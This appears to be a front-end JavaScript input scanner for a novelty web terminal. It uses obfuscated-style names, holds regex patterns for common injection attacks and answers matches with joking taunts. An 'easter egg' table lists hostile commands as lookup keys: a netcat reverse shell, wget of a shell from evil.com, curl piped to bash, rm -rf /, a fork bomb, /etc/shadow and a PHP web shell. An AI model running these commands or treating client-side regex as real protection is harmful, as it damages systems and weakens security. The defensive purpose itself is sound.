/* ============================================
   DCG PANAMA — ATTACK DETECTION MODULE
   Obfuscated security layer for terminal
   ============================================ */

(function(_0x4a2b) {
  const _0x5c3d = {
    // XSS patterns
    _0xa1: [/<script[^>]*>.*?<\/script>/gi, /<img[^>]*onerror/gi, /<svg[^>]*onload/gi, 
           /javascript:/gi, /on\w+\s*=/gi, /<iframe/gi, /eval\s*\(/gi, 
           /document\.cookie/gi, /document\.write/gi, /<object/gi, /<embed/gi],
    
    // SQLi patterns  
    _0xb2: [/(\%27)|(\')|(\-\-)|(\%23)|(#)/gi, /\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/gi,
           /union.*select/gi, /select.*from/gi, /insert.*into/gi, /delete.*from/gi,
           /drop.*table/gi, /update.*set/gi, /exec(\s|\+)+(s|x)p\w+/gi],
    
    // SSTI patterns
    _0xc3: [/\{\{.*\}\}/g, /\{%.*%\}/g, /\$\{.*\}/g, /#\{.*\}/g, 
           /<%.*%>/g, /\[\[.*\]\]/g],
    
    // Command Injection
    _0xd4: [/;.*\s*(ls|cat|wget|curl|nc|bash|sh|cmd|powershell)/gi, 
           /\|.*\s*(ls|cat|wget|curl|nc|bash|sh|cmd)/gi,
           /`.*`/g, /\$\(.*\)/g, /&&.*\s*(ls|cat|wget|curl|nc)/gi],
    
    // Path Traversal
    _0xe5: [/\.\.\/\.\.\//g, /\.\.\\\.\.\\/, /%2e%2e%2f/gi, /%2e%2e\\/gi,
           /\.\.;/g, /\.\.\//g],
    
    // LDAP Injection
    _0xf6: [/\*\)\(.*\(/g, /\)\(.*\|\(/g, /\*\|/g],
    
    // XXE patterns
    _0xa7: [/<!ENTITY/gi, /<!DOCTYPE/gi, /SYSTEM/gi],
    
    // NoSQL Injection
    _0xb8: [/\$ne\s*:/gi, /\$gt\s*:/gi, /\$where\s*:/gi, /\$regex\s*:/gi]
  };

  const _0x7e8f = [
    "🐀 Uuuuh you sneaky rat, what are you trying?",
    "🚨 Nice try, script kiddie. Our IDS just flagged you.",
    "⚠️  ANOMALY DETECTED — Attack pattern recognized. Logging to /dev/null...",
    "🛡️  WAF TRIGGERED — Request blocked. Try harder.",
    "🔴 INTRUSION ATTEMPT LOGGED — Your IP has been added to /etc/naughty_list",
    "💀 [HONEYPOT ACTIVATED] — Welcome to the trap, friend.",
    "🎯 Clever... but not clever enough. Security through obscurity failed you.",
    "🔒 ACCESS DENIED — This terminal has seen worse. Much worse.",
    "👁️  We see you. And we're not impressed.",
    "⛔ FORBIDDEN — Did you really think that would work here?",
    "🎪 Attack detected! Would you like to speak to our security team? [Y/n]",
    "🐛 BUG DETECTED — Oh wait, that's a feature. No, actually it's you trying to hack us.",
    "🚫 Error 1337: Hacking attempt too obvious. Please try again with more creativity.",
    "🎓 Tutorial mode detected. May we suggest reading OWASP first?",
    "💣 PAYLOAD NEUTRALIZED — Better luck next time, hacker wannabe.",
    "🕵️  Attack vector identified. Countermeasures deployed. Have a nice day!",
    "⚡ ELECTRIC FENCE ACTIVATED — Bzzzzt! That hurts, doesn't it?",
    "🎭 Interesting payload. We've added it to our training dataset. Thanks!",
    "🔐 Your attack has been forwarded to /dev/random for processing.",
    "👾 GAME OVER — Insert coin to try again."
  ];

  function _0x9f1a(_0x1b2c) {
    const _0x3d4e = _0x1b2c.toLowerCase();
    
    // Check all pattern categories
    for (let _0x5f6g in _0x5c3d) {
      for (let _0x7h8i of _0x5c3d[_0x5f6g]) {
        if (_0x7h8i.test(_0x1b2c)) {
          return {
            _0x8j9k: true,
            _0x9l0m: _0x7e8f[Math.floor(Math.random() * _0x7e8f.length)],
            _0xan1b: _0x5f6g
          };
        }
      }
    }
    
    return { _0x8j9k: false };
  }

  // Advanced evasion detection
  function _0x2c3d(_0x4e5f) {
    const _0x6g7h = {
      // URL encoding variations
      _0x1: /%3C/gi,  // <
      _0x2: /%3E/gi,  // >
      _0x3: /%22/gi,  // "
      _0x4: /%27/gi,  // '
      _0x5: /%2F/gi,  // /
      _0x6: /&#x/gi,  // HTML entity
      _0x7: /&#\d/gi,
      // Double encoding
      _0x8: /%25%33%43/gi, // %3C
      // Unicode tricks
      _0x9: /\\u00/gi,
      // Null byte injection
      _0x10: /%00/gi,
      // Mixed case evasion
      _0x11: /SeLeCt/i,
      _0x12: /UnIoN/i,
      _0x13: /ScRiPt/i
    };

    for (let _0xkey in _0x6g7h) {
      if (_0x6g7h[_0xkey].test(_0x4e5f)) {
        return {
          _0x8j9k: true,
          _0x9l0m: "🧠 Encoding tricks? We decode faster than you encode, friend.",
          _0xan1b: 'evasion'
        };
      }
    }
    
    return { _0x8j9k: false };
  }

  // Polyglot detection (multi-attack payloads)
  function _0x3e4f(_0x5g6h) {
    let _0xcount = 0;
    const _0xspecial = ['<', '>', '"', "'", '{', '}', '|', ';', '&', '$', '`', '(', ')'];
    
    for (let _0xchar of _0xspecial) {
      if (_0x5g6h.includes(_0xchar)) _0xcount++;
    }
    
    // Suspicious if too many special chars
    if (_0xcount >= 5 && _0x5g6h.length < 100) {
      return {
        _0x8j9k: true,
        _0x9l0m: "🎨 Nice polyglot attempt! We appreciate the creativity, but no.",
        _0xan1b: 'polyglot'
      };
    }
    
    return { _0x8j9k: false };
  }

  // Export scanner function
  _0x4a2b._0xSECCHECK = function(_0xinput) {
    // Run all detection layers
    let _0xres1 = _0x9f1a(_0xinput);
    if (_0xres1._0x8j9k) return _0xres1;
    
    let _0xres2 = _0x2c3d(_0xinput);
    if (_0xres2._0x8j9k) return _0xres2;
    
    let _0xres3 = _0x3e4f(_0xinput);
    if (_0xres3._0x8j9k) return _0xres3;
    
    return { _0x8j9k: false };
  };

  // Easter egg for specific payloads
  _0x4a2b._0xEASTEREGG = {
    'rm -rf /': "😱 WOAH THERE! What a loser LMAO!",
    'sudo rm -rf /': "🎭 Sudo? In a JavaScript terminal? I admire your optimism.",
    ':(){ :|:& };:': "💣 Fork bomb detected! Fortunately, we have infinite processes. Try again!",
    'chmod 777 /': "🔓 Ah yes, the classic 'security by insecurity'. Denied.",
    'nc -e /bin/sh': "🌐 Reverse shell? How 2005 of you. Connection refused.",
    'wget http://evil.com/shell.php': "📥 Download blocked. Our firewall says 'evil.com' is a dead giveaway.",
    'curl http://malicious.site | bash': "⚠️  Piping to bash? That's a bold strategy. It did not pay off.",
    '/etc/passwd': "📄 System files are off-limits. Also, there are no users. This is the void.",
    '/etc/shadow': "👻 Looking for shadows? This terminal casts none.",
    '<?php system($_GET[\"cmd\"]); ?>': "🐘 PHP web shell? Wrong environment, friend. Try a .php file next time."
  };

  // Log attacks (optional)
  _0x4a2b._0xLOGATTACK = function(_0xtype, _0xpayload) {
    const _0xtimestamp = new Date().toISOString();
    // In production, this would send to a real logging service
    console.log(`[SECURITY] ${_0xtimestamp} | Type: ${_0xtype} | Payload: ${_0xpayload.substring(0, 50)}`);
  };

})(window);